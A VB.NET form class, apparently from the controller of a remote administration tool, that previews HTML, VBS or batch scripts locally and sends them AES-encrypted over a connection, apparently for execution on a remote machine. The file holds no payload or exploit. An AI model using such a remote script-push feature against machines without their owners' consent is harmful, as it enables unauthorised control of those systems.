Public Class Scripting
    Public connected As Connection
#Region "HTML"
    Private Sub btn_test_html_Click(sender As Object, e As EventArgs) Handles btn_test_html.Click
        IO.File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\scriptingpreview.html", RichTextBox1.Text)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\scriptingpreview.html")
    End Sub
    Private Sub btn_send_html_Click(sender As Object, e As EventArgs) Handles btn_send_html.Click
        connected.Send(New Encryption().AES_Encrypt("HTMLScripting" & RichTextBox1.Text, Form1.enckey))
    End Sub
#End Region
#Region "VBS"
    Private Sub btn_test_vbs_Click(sender As Object, e As EventArgs) Handles btn_test_vbs.Click
        IO.File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\scriptingpreview.vbs", RichTextBox2.Text)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\scriptingpreview.vbs")
    End Sub
    Private Sub btn_send_vbs_Click(sender As Object, e As EventArgs) Handles btn_send_vbs.Click
        connected.Send(New Encryption().AES_Encrypt("VBSScripting" & RichTextBox2.Text, Form1.enckey))
    End Sub
#End Region
#Region "Batch"
    Private Sub btn_test_batch_Click(sender As Object, e As EventArgs) Handles btn_test_batch.Click
        IO.File.WriteAllText(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\scriptingpreview.bat", RichTextBox3.Text)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp.ToString() & "\scriptingpreview.bat")
    End Sub
    Private Sub btn_send_batch_Click(sender As Object, e As EventArgs) Handles btn_send_batch.Click
        connected.Send(New Encryption().AES_Encrypt("BATScripting" & RichTextBox3.Text, Form1.enckey))
    End Sub
#End Region
End Class